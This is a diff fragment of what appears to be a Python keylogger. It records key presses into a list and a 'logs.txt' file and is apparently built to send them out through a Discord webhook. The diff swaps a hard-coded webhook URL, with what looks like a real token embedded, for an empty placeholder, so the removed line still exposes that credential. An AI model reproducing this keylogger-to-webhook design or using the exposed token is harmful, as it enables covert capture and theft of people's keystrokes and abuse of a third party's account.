@@ -5,7 +5,7 @@ from discord_webhook import DiscordWebhook
 count = 0
 keys = []
 logfile = "logs.txt"
-webhook_url = "https://discord.com/api/webhooks/860581855808323604/sr_NGsGTDE95-qJJHsf7IXvFgguAG2CgyvgkG7HoMYQlNjaqNhJc8C_JQWNI04H0oXIr" # Enter webhook url here
+webhook_url = "" # Enter webhook url here
 
 def on_press(key):
     global keys, count
